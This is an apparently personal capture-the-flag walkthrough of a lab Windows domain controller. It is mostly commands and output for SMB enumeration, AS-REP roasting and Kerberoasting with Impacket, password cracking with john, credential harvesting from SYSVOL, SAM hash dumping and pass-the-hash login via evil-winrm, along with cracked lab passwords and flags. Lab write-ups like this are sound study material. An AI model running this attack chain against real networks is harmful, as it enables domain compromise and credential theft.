# Vulnet_Roasted 

> VOiD | Wednesday 26 January 2022 01:56:04 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.73.15


## PORT 139 [SMB]
```bash
smbclient -L 10.10.73.15
Enter WORKGROUP\voids password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing

smbclient  \\\\10.10.73.15\\VulnNet-Business-Anonymous

Alexa Whitehat core business manager.
Jack Goldenhand


smbclient  \\\\10.10.73.15\\VulnNet-Enterprise-Anonymous
Tony Skid is a core security manager
Johnny Leet

Read Only IPC$ signifies that we can enumerate usernames. Lets use impacket for this task
lookupsid.py anonymous@10.10.73.15

take SidTypeUsers and add them to a user.txt


GetNPUsers.py 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.73.15

we get t-skid user hash
john hash_kerberos_t-skid --wordlist=/usr/share/wordlists/rockyou.txt

tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)

```

## Keberoasting

```bash
GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.73.15
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528             

john keberoast.hash --wordlist=/usr/share/wordlists/rockyou.txt              1 ⨯

ry=ibfkfv,s6h,   enterprise-core-vn$VULNNET-RST.LOCAL

evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.73.15

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> cat user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}



 smbclient  \\\\10.10.73.15\\SYSVOL -U enterprise-core-vn                   130 ⨯
Enter WORKGROUP\enterprise-core-vns password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 19:19:49 2021
  ..                                  D        0  Thu Mar 11 19:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 19:19:49 2021

		8771839 blocks of size 4096. 4554400 blocks available


strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"


secretsdump.py 'VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht'@10.10.73.15
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesnt have hash information.
[*] Dumping cached domain logon information (domain/username:hash)


evil-winrm -u 'Administrator' -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.73.15

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}

```
